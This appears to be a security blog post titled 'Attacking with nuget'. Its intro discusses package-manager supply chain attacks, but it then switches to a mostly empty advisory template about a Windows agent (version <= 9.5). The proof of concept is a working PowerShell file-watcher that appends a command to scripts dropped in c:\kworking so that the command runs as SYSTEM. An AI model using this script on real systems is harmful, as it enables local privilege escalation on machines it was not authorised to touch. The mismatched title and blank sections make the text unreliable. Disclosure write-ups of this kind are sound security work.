---
layout: post
category: published
title: Attacking with nuget
---

<p>
Supply chain attacks through package management is nothing new but I have been looking into how it could be used
to attack an organization recently. I wanted to see how easy it would be to target an organization and what steps would
be required to use this to gain a foothold.
</p>

<h3>Product</h3>
<h4>Windows 10. Agent version <= 9.5</h4>
<p>

</p>
  
<h3>Vulnerability</h3>
<p>
 
</p>


  
<p>

</p>

<h3>Impact</h3>
<p>

</p>

<h3>Proof of concept</h3>
This PowerShell script will use a file monitor against the default working directory.
When a ps1 script drops from a scheduled task or run from the VSA web application it will then append the command "Write-Host 'injected content'" which will run as SYSTEM.

<pre>
  <code>
      $folder = 'c:\kworking' 
      $filter = '*.ps1'                          

      $filesystem = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter =  [IO.NotifyFilters]'FileName, LastWrite'}

      Register-ObjectEvent $filesystem Created -SourceIdentifier FileCreated -Action { 
          $path = $Event.SourceEventArgs.FullPath 
          "`nWrite-Host 'injected content'" | Out-File -Append -FilePath $path -Encoding utf8 
          Unregister-Event FileCreated
      }
  </code>
</pre>


